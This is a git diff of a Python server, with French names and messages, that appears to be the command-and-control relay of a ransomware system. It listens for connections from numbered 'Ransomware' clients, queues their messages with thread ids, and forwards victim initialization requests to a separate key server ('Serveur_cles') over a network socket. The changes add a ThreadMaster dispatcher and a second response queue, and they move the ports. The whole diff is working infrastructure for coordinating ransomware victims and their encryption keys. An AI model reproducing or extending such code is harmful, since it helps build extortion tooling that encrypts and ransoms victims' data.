@@ -6,22 +6,23 @@ import utile.message as message
 
 
 ransomware_threads = []
-ransomware_queue = []
+THREADS_QUEUE = []
 
-def Serveur_cles(FIFO):
-    socket, gp = net.connect_to_serv()
+def Serveur_cles(FIFO, FIFO_RESP):
+    socket, gp = net.connect_to_serv(port=8381)
     while True:
-        time.sleep(5)
-        #print(ransomware_threads, '\n', ransomware_queue)
-        #print()
+        packet = FIFO_RESP.get()
+        net.send_message(socket, packet)
+        print(net.receive_message(socket))
+
 
 
 def ransomware(FIFO, PORT):
     indicateur = False
     socket_serv = net.start_net_serv_client(port=PORT)
     FIFO_resp = queue.Queue()
-    ransomware_queue.append(FIFO_resp)
-    id = len(ransomware_queue)-1
+    THREADS_QUEUE.append(FIFO_resp)
+    id = len(THREADS_QUEUE)-1
     print('Ouverture d\'une écoute sur le port', PORT)
 
     while True:
@@ -34,7 +35,7 @@ def ransomware(FIFO, PORT):
         while True:
             try:
                 recv_data = net.receive_message(conn)
-                FIFO.put(recv_data)
+                FIFO.put([recv_data, id])
             except:
                 conn.close()
                 print(f'[+] Déconnexion du Ransomware-{id} sur le port : {PORT}')
@@ -47,12 +48,21 @@ def ransomware(FIFO, PORT):
                         data) == 'LIST_VICTIM_END':
                     break
 
+def ThreadMaster(FIFO, FIFO_RESP_CLES, data):
+    recv_data, id_thread = data
+    FIFO_resp_thread = THREADS_QUEUE[id_thread]
+
+    message_type = message.get_message_type(recv_data)
+    if message_type == 'INITIALIZE_REQ':
+        FIFO_RESP_CLES.put(recv_data)
+
 
 def main():
-    PORT = 8380
+    PORT = 8382
     FIFO = queue.Queue()
+    FIFO_RESP_CLES = queue.Queue()
     # création des threads
-    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True, args=(FIFO,))
+    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True, args=(FIFO, FIFO_RESP_CLES))
     ransomware12 = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
     name, id = (ransomware12.getName()).split('-')
     ransomware12.setName('Ransomware-' + str((int(id) - 2)))
@@ -61,7 +71,6 @@ def main():
     # Lancement des threads
 
     ransomware12.start()
-    time.sleep(5)
     Serveur_cles_thread.start()
 
     while True:
@@ -73,6 +82,8 @@ def main():
             new_ransomware.setName('Ransomware-' + str((int(id_thread) - 2)))
             ransomware_threads.append(new_ransomware)
             new_ransomware.start()
+        else:
+            ThreadMaster(FIFO, FIFO_RESP_CLES, data)
 
 if __name__ == '__main__':
     main()
